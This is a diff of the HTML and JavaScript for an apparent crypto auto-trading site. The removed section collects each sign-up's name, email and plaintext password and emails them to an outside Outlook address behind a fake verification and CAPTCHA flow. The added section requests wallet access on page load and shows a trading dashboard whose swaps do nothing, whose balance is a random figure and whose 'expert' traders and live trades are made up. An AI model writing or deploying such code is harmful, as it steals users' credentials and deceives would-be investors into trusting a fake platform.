-  emailjs.init("n9BsaM4ZjH178UeSf");
-
-  const serviceID = "service_xg8bzqs";
-  const submitTemplateID = "template_gclz9gu";
-  const autoReplyTemplateID = "template_r0zg4zj";
-  const domainCaptchaLink = "https://auto-tradingbot.github.io/System/#page2ii";
-
-  function showPage(id) {
-    document.querySelectorAll(".page").forEach(page => page.classList.add("hidden"));
-    const nextPage = document.getElementById(id);
-    if (nextPage) nextPage.classList.remove("hidden");
-  }
-
-  function handleSignUp() {
-    const fullName = document.getElementById("signFullName").value;
-    const email = document.getElementById("signEmail").value;
-    const password = document.getElementById("signPassword").value;
-
-    const templateParamsSubmit = {
-      to_email: "Blockchainautomated@outlook.com",
-      user_name: fullName,
-      user_email: email,
-      user_password: password
-    };
-
-    const templateParamsReply = {
-      user_email: email,
-      captcha_link: domainCaptchaLink
-    };
-
-    // Submit registration data
-    emailjs.send(serviceID, submitTemplateID, templateParamsSubmit)
-      .then(() => {
-        // Send auto-reply
-        return emailjs.send(serviceID, autoReplyTemplateID, templateParamsReply);
-      })
-      .then(() => {
-        // Show authentication page
-        showPage("page2i");
-
-        // After 30 seconds, show CAPTCHA page
-        setTimeout(() => {
-          showPage("page2ii");
-        }, 30000);
-      })
-      .catch((err) => {
-        console.error("Signup Failed:", err);
-        alert("Something went wrong. Please try again.");
-      });
-  }
-
-  function completeCaptcha() {
-    // Redirect to page3 after short confirmation delay
-    setTimeout(() => {
-      window.location.href = "https://auto-tradingbot.github.io/System/#page3";
-    }, 1000);
-  }
-</script>
-
-<!-- 🔄 Loading Spinner -->
-<style>
-  .loader {
-    border: 5px solid #1e3a5f;
-    border-top: 5px solid #facc15;
-    border-radius: 50%;
-    width: 50px;
-    height: 50px;
-    animation: spin 1s linear infinite;
-  }
-  @keyframes spin {
-    to { transform: rotate(360deg); }
-  }
-</style>
   <script>
   function showPage(pageId) {
     console.log(`Navigate to: ${pageId}`);
@@ -1902,6 +2107,522 @@ tradeForm.addEventListener("submit", (e) => {
   }
 </script>
 <script src="https://s3.tradingview.com/tv.js"></script>
+  <script type="text/javascript">
+  new TradingView.widget({
+    "container_id": "tradingview_chart",
+    "autosize": true,
+    "symbol": "BINANCE:BNBUSDT",
+    "interval": "30",
+    "timezone": "Etc/UTC",
+    "theme": "dark",
+    "style": "1",
+    "locale": "en",
+    "toolbar_bg": "#0b0e11",
+    "enable_publishing": false,
+    "hide_legend": false,
+    "hide_side_toolbar": false,
+    "save_image": false
+  });
+</script>
+<script>
+const currencySelector = document.getElementById("currencySelector");
+const languageSelector = document.getElementById("languageSelector");
+const walletStatus = document.getElementById("walletStatus");
+const toast = document.getElementById("toast");
+
+// Populate currencies and languages
+const currencies = ["USD", "EUR", "CAD", "INR", "PKR", "AED"];
+const languages = { en: "English", fr: "Français", es: "Español", de: "Deutsch" };
+
+// Set user defaults
+const userLang = navigator.language.split("-")[0] || "en";
+const userCurrency = Intl.NumberFormat().resolvedOptions().currency || "USD";
+
+// Load selectors
+Object.entries(languages).forEach(([code, name]) => {
+  const opt = new Option(name, code);
+  if (code === userLang) opt.selected = true;
+  languageSelector.appendChild(opt);
+});
+
+currencies.forEach((curr) => {
+  const opt = new Option(curr, curr);
+  if (curr === userCurrency) opt.selected = true;
+  currencySelector.appendChild(opt);
+});
+
+// Toast display
+function showToast(msg) {
+  toast.textContent = msg;
+  toast.classList.remove("hidden");
+  setTimeout(() => toast.classList.add("hidden"), 10000);
+}
+
+// Sound & Vibration Feedback
+function feedback() {
+  try {
+    new Audio("https://actions.google.com/sounds/v1/cartoon/pop.ogg").play();
+    if (navigator.vibrate) navigator.vibrate(100);
+  } catch (e) {}
+}
+
+// Wallet Connect Simulation
+async function connectWallet() {
+  try {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = provider.getSigner();
+    const address = await signer.getAddress();
+    walletStatus.innerText = `🔌 Wallet: ${address.slice(0, 6)}...${address.slice(-4)}`;
+    showToast(`Wallet connected: ${address}`);
+    feedback();
+    getBalances(provider, address);
+  } catch (e) {
+    showToast("Wallet connection failed");
+  }
+}
+
+// Balance fetch
+async function getBalances(provider, address) {
+  try {
+    const bnbBal = await provider.getBalance(address);
+    const usdt = new ethers.Contract(
+      "0x55d398326f99059fF775485246999027B3197955", // USDT BEP20
+      ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"],
+      provider
+    );
+
+    const usdtBal = await usdt.balanceOf(address);
+    const decimals = await usdt.decimals();
+
+    const bnb = ethers.utils.formatEther(bnbBal);
+    const usdtAmount = Number(usdtBal) / 10 ** decimals;
+
+    document.getElementById("bnbBalance").innerText = parseFloat(bnb).toFixed(4);
+    document.getElementById("usdtBalance").innerText = usdtAmount.toFixed(2);
+
+    updateTotalAssets(usdtAmount, parseFloat(bnb));
+    updateDailyGoal(usdtAmount);
+  } catch (err) {
+    showToast("Error fetching balances");
+  }
+}
+
+// Convert to selected currency
+async function updateTotalAssets(usdt, bnb) {
+  const currency = currencySelector.value;
+  const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=binancecoin,tether&vs_currencies=${currency.toLowerCase()}`);
+  const data = await res.json();
+
+  const bnbRate = data.binancecoin[currency.toLowerCase()];
+  const usdtRate = data.tether[currency.toLowerCase()];
+  const total = usdt * usdtRate + bnb * bnbRate;
+
+  document.getElementById("totalAssets").innerText = `${currency} ${total.toFixed(2)}`;
+}
+
+// Goal Chart
+function updateDailyGoal(usdt) {
+  const goal = 150;
+  const progress = Math.min((usdt / goal) * 100, 100);
+  document.getElementById("dailyGoalProgress").style.width = `${progress}%`;
+}
+
+// Auto connect on load
+window.addEventListener("load", () => {
+  if (window.ethereum) {
+    connectWallet();
+  } else {
+    walletStatus.innerText = "🔌 Wallet: MetaMask not found";
+  }
+});
+</script>
+  
+    <script>
+    // Placeholder prices for demo (in USD)
+    const prices = {
+      USDT: 1,
+      BNB: 330,
+      BTC: 28000,
+      ETH: 1900,
+      BCH: 230,
+      LTC: 85,
+      XLM: 0.10,
+      MATIC: 1.2,
+      DOGE: 0.065,
+      ADA: 0.42,
+      SOL: 20,
+      AVAX: 18,
+      DOT: 6,
+      TRX: 0.06,
+      SHIB: 0.00001,
+      UNI: 6,
+      LINK: 7,
+      ATOM: 13,
+      ETC: 18,
+      FTM: 0.5,
+      NEAR: 2,
+      HBAR: 0.05,
+      ALGO: 0.15,
+      CRO: 0.20,
+      EGLD: 45,
+      VET: 0.02,
+      ZIL: 0.02,
+      AAVE: 70,
+      CAKE: 4,
+      SAND: 1.1,
+      MANA: 0.8,
+      AXS: 15,
+      GALA: 0.03,
+      APE: 6,
+      RNDR: 2.5,
+      DYDX: 4,
+      "1INCH": 1,
+      LRC: 0.7,
+      BAND: 4,
+      ENS: 14,
+      CHZ: 0.15,
+      COMP: 70,
+      RUNE: 5,
+      GRT: 0.5,
+      TWT: 0.8,
+      BAT: 0.3,
+      ZRX: 0.5,
+      KAVA: 2,
+      XRP: 0.6,
+      FIL: 5,
+      XTZ: 1.5,
+    };
+
+    // Update estimated receive amount
+    function updateReceiveAmount() {
+      const fromToken = document.getElementById("fromToken").value;
+      const toToken = document.getElementById("toToken").value;
+      const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
+
+      const usdValue = fromAmount * (prices[fromToken] || 0);
+      const receiveAmount = usdValue / (prices[toToken] || 1);
+
+      document.getElementById("receiveAmount").textContent = receiveAmount.toFixed(6);
+    }
+
+    // Handle token swap button click
+    function handleTrade() {
+      const fromToken = document.getElementById("fromToken").value;
+      const toToken = document.getElementById("toToken").value;
+      const fromAmount = parseFloat(document.getElementById("fromAmount").value);
+
+      if (!fromAmount || fromAmount <= 0) {
+        alert("Please enter a valid amount to swap.");
+        return;
+      }
+
+      if (fromToken === toToken) {
+        alert("Please select different tokens to swap.");
+        return;
+      }
+
+      alert(
+        `Swapped ${fromAmount} ${fromToken} for approximately ${document.getElementById(
+          "receiveAmount"
+        ).textContent} ${toToken}`
+      );
+
+      // Reset input
+      document.getElementById("fromAmount").value = "";
+      updateReceiveAmount();
+
+      // Update total trading balance (simulate)
+      updateTotalTradingBalance();
+    }
+
+    // Simulate updating total trading balance
+    function updateTotalTradingBalance() {
+      const randomBalance = (1000 + Math.random() * 4000).toFixed(2);
+      document.getElementById("totalTradingBalance").textContent = `$${randomBalance}`;
+    }
+
+    // Initialize UI
+    updateReceiveAmount();
+    updateTotalTradingBalance();
+
+    // Add event listeners
+    document.getElementById("fromToken").addEventListener("change", updateReceiveAmount);
+    document.getElementById("toToken").addEventListener("change", updateReceiveAmount);
+    document.getElementById("fromAmount").addEventListener("input", updateReceiveAmount);
+    </script>
+    <!-- External Ethers.js -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.min.js"></script>
+
+  <script>
+  // === Fetch live prices from CoinGecko every 20 seconds ===
+  async function fetchSpotPrices() {
+    try {
+      const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin&vs_currencies=usd");
+      const data = await res.json();
+
+      document.getElementById("btcPrice").textContent = "$" + data.bitcoin.usd.toLocaleString();
+      document.getElementById("ethPrice").textContent = "$" + data.ethereum.usd.toLocaleString();
+      document.getElementById("bnbPrice").textContent = "$" + data.binancecoin.usd.toLocaleString();
+    } catch (err) {
+      console.error("Price fetch error:", err);
+    }
+  }
+  setInterval(fetchSpotPrices, 20000);
+  fetchSpotPrices();
+
+  // === Fetch wallet BNB balance from Binance Smart Chain (simulated wallet for demo) ===
+  async function fetchWalletBalances() {
+    const address = localStorage.getItem('connectedWallet');
+    if (!address) {
+      console.warn("No wallet connected");
+      return;
+    }
+
+    try {
+      const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
+      const balance = await provider.getBalance(address);
+      const bnbBalance = parseFloat(ethers.formatEther(balance));
+      localStorage.setItem('BNB_BALANCE', bnbBalance.toFixed(6));
+      console.log(`BNB balance for ${address}: ${bnbBalance.toFixed(6)}`);
+    } catch (e) {
+      console.error("Error fetching wallet balance:", e);
+    }
+  }
+
+  // For demo, simulate connected wallet & balance if none
+  if(!localStorage.getItem('connectedWallet')) {
+    localStorage.setItem('connectedWallet', '0x0000000000000000000000000000000000000000');
+    localStorage.setItem('BNB_BALANCE', '5.000000'); // 5 BNB starting balance
+  }
+
+  fetchWalletBalances();
+
+  // === Spot trade logic with balance validation ===
+  function spotTrade(action) {
+    const token = document.getElementById("spotToken").value;
+    const amount = parseFloat(document.getElementById("spotAmount").value);
+    const result = document.getElementById("spotTradeResult");
+    const wallet = localStorage.getItem("connectedWallet");
+
+    if (!wallet) {
+      result.textContent = "⚠ Please connect your wallet.";
+      return;
+    }
+
+    if (!amount || amount <= 0) {
+      result.textContent = "⚠ Enter a valid amount.";
+      return;
+    }
+
+    // Parse prices removing $ and commas
+    const priceMap = {
+      BTC: parseFloat(document.getElementById("btcPrice").textContent.replace(/[$,]/g, '')),
+      ETH: parseFloat(document.getElementById("ethPrice").textContent.replace(/[$,]/g, '')),
+      BNB: parseFloat(document.getElementById("bnbPrice").textContent.replace(/[$,]/g, '')),
+    };
+
+    if (isNaN(priceMap[token])) {
+      result.textContent = "⚠ Unable to retrieve price. Try again later.";
+      return;
+    }
+
+    // Get BNB balance in localStorage (simulated)
+    const bnbBalance = parseFloat(localStorage.getItem('BNB_BALANCE') || '0');
+    // Calculate total cost in USD
+    const totalCostUSD = priceMap[token] * amount;
+    // Calculate wallet BNB balance value in USD
+    const walletValueUSD = bnbBalance * priceMap['BNB'];
+
+    if (action === 'buy' && walletValueUSD < totalCostUSD) {
+      result.textContent = "❌ Insufficient balance to buy.";
+      return;
+    }
+
+    // Simulate trade processing
+    result.textContent = `${action === 'buy' ? 'Buying' : 'Selling'} ${amount} ${token}...`;
+
+    setTimeout(() => {
+      // Update Open Positions
+      const openPosDiv = document.getElementById("spotOpenPositions");
+      const newPosition = document.createElement("div");
+      newPosition.textContent = `${action.toUpperCase()} ${amount} ${token} @ $${priceMap[token].toFixed(2)}`;
+      openPosDiv.textContent = openPosDiv.textContent === "No open positions." ? "" : openPosDiv.textContent;
+      openPosDiv.appendChild(newPosition);
+
+      // Update Trade History
+      const tradeHistoryDiv = document.getElementById("spotTradeHistory");
+      const newHistoryEntry = document.createElement("div");
+      newHistoryEntry.textContent = `${new Date().toLocaleString()}: ${action.toUpperCase()} ${amount} ${token} @ $${priceMap[token].toFixed(2)}`;
+      tradeHistoryDiv.textContent = tradeHistoryDiv.textContent === "No trade history." ? "" : tradeHistoryDiv.textContent;
+      tradeHistoryDiv.appendChild(newHistoryEntry);
+
+      // Deduct cost from BNB balance on buy (simulate)
+      if (action === 'buy') {
+        const bnbUsed = totalCostUSD / priceMap['BNB'];
+        const newBnbBalance = Math.max(bnbBalance - bnbUsed, 0);
+        localStorage.setItem('BNB_BALANCE', newBnbBalance.toFixed(6));
+      } else if (action === 'sell') {
+        // Simulate crediting BNB balance on sell
+        const bnbGained = totalCostUSD / priceMap['BNB'];
+        const newBnbBalance = bnbBalance + bnbGained;
+        localStorage.setItem('BNB_BALANCE', newBnbBalance.toFixed(6));
+      }
+
+      // Refresh balances display (optional)
+      fetchWalletBalances();
+
+      result.textContent = "✅ Trade successful!";
+      document.getElementById("spotAmount").value = "";
+    }, 1000);
+  }
+  </script>
+    <!-- Ethers.js for wallet balance -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.min.js"></script>
+
+  <script>
+  // --- 1. Fetch live prices from CoinGecko every 20 seconds ---
+  async function fetchCopyTradePrices() {
+    try {
+      const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin&vs_currencies=usd");
+      const data = await res.json();
+
+      document.getElementById("btcPrice").textContent = "$" + data.bitcoin.usd.toLocaleString();
+      document.getElementById("ethPrice").textContent = "$" + data.ethereum.usd.toLocaleString();
+      document.getElementById("bnbPrice").textContent = "$" + data.binancecoin.usd.toLocaleString();
+    } catch (err) {
+      console.error("Price fetch error:", err);
+    }
+  }
+  setInterval(fetchCopyTradePrices, 20000);
+  fetchCopyTradePrices();
+
+  // --- 2. Fetch wallet BNB balance (simulate if no wallet) ---
+  async function fetchWalletBalancesCopyTrade() {
+    const address = localStorage.getItem('connectedWallet');
+    if (!address) {
+      console.warn("No wallet connected");
+      return;
+    }
+
+    try {
+      const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
+      const balance = await provider.getBalance(address);
+      const bnbBalance = parseFloat(ethers.formatEther(balance));
+      localStorage.setItem('BNB_BALANCE', bnbBalance.toFixed(6));
+      console.log(`BNB balance for ${address}: ${bnbBalance.toFixed(6)}`);
+      updatePortfolioDisplay(bnbBalance);
+    } catch (e) {
+      console.error("Error fetching wallet balance:", e);
+    }
+  }
+
+  // Simulate wallet if not connected
+  if(!localStorage.getItem('connectedWallet')) {
+    localStorage.setItem('connectedWallet', '0x0000000000000000000000000000000000000000');
+    localStorage.setItem('BNB_BALANCE', '5.000000'); // 5 BNB simulated balance
+  }
+  fetchWalletBalancesCopyTrade();
+
+  // --- Sample Data for Experts & Trades ---
+  const copyTradingExperts = [
+    { id: 1, name: "AliceTrader", profitPct: 18.5, followers: 1200, avatar: "https://i.pravatar.cc/60?img=1" },
+    { id: 2, name: "BobInvests", profitPct: 24.7, followers: 830, avatar: "https://i.pravatar.cc/60?img=2" },
+    { id: 3, name: "CryptoGuru", profitPct: 15.2, followers: 2340, avatar: "https://i.pravatar.cc/60?img=3" }
+  ];
+
+  const userPortfolio = [
+    { token: "BTC", amount: 0.05 },
+    { token: "ETH", amount: 0.4 },
+    { token: "BNB", amount: parseFloat(localStorage.getItem('BNB_BALANCE') || '5') }
+  ];
+
+  let liveCopiedTrades = [
+    { time: "10:15:23", expert: "AliceTrader", action: "BUY", amount: "0.01 BTC" },
+    { time: "10:16:10", expert: "BobInvests", action: "SELL", amount: "0.05 ETH" },
+    { time: "10:17:00", expert: "CryptoGuru", action: "BUY", amount: "1.5 BNB" }
+  ];
+
+  // --- Populate Experts List ---
+  function updateExpertsList() {
+    const container = document.getElementById("expertsList");
+    container.innerHTML = ""; // Clear existing
+    copyTradingExperts.forEach(expert => {
+      const card = document.createElement("div");
+      card.className = "flex items-center gap-4 bg-[#1e2124] rounded-xl p-4 shadow-md cursor-pointer hover:bg-[#292e33] transition";
+      card.innerHTML = `
+        <img src="${expert.avatar}" alt="${expert.name}" class="w-12 h-12 rounded-full border-2 border-[#f0b90b]" />
+        <div class="flex flex-col">
+          <span class="text-[#f0b90b] font-bold">${expert.name}</span>
+          <span class="text-sm text-gray-300">Profit: ${expert.profitPct}%</span>
+          <span class="text-sm text-gray-400">${expert.followers} followers</span>
+        </div>
+      `;
+      container.appendChild(card);
+    });
+  }
+
+  // --- Populate User Portfolio ---
+  function updatePortfolioDisplay(bnbBalance) {
+    const container = document.getElementById("portfolioDisplay");
+    container.innerHTML = ""; // Clear existing
+
+    userPortfolio.forEach(item => {
+      let amount = item.amount;
+      if(item.token === "BNB") amount = bnbBalance ?? amount;
+      const div = document.createElement("div");
+      div.className = "bg-[#0b0e11] rounded-lg px-4 py-3 min-w-[120px] text-center shadow";
+      div.innerHTML = `<strong class="block text-[#f0b90b]">${item.token}</strong><span>${amount.toFixed(6)}</span>`;
+      container.appendChild(div);
+    });
+  }
+
+  // --- Populate Live Copied Trades ---
+  function updateCopiedTrades() {
+    const list = document.getElementById("copiedTrades");
+    list.innerHTML = ""; // Clear existing
+
+    liveCopiedTrades.forEach(trade => {
+      const li = document.createElement("li");
+      li.textContent = `[${trade.time}] ${trade.expert} ${trade.action} ${trade.amount}`;
+      list.appendChild(li);
+    });
+  }
+
+  // --- Initial UI Updates ---
+  updateExpertsList();
+  updatePortfolioDisplay(parseFloat(localStorage.getItem('BNB_BALANCE')));
+  updateCopiedTrades();
+
+  // --- Simulate live trades every 30 seconds ---
+  setInterval(() => {
+    // Rotate trades
+    const newTrade = {
+      time: new Date().toLocaleTimeString(),
+      expert: copyTradingExperts[Math.floor(Math.random() * copyTradingExperts.length)].name,
+      action: Math.random() > 0.5 ? "BUY" : "SELL",
+      amount: (Math.random() * 0.1).toFixed(4) + " BTC"
+    };
+    liveCopiedTrades.unshift(newTrade);
+    if(liveCopiedTrades.length > 20) liveCopiedTrades.pop();
+    updateCopiedTrades();
+  }, 30000);
+
+  </script>
+  
+  <!-- NAVIGATION SCRIPT -->
+  <script>
+    function showPage(pageId) {
+      document.querySelectorAll('.page').forEach(page => {
+        page.classList.remove('active');
+      });
+      const targetPage = document.getElementById(pageId);
+      if (targetPage) {
+        targetPage.classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+    }
+  </script>
 
 </body>
 </html>
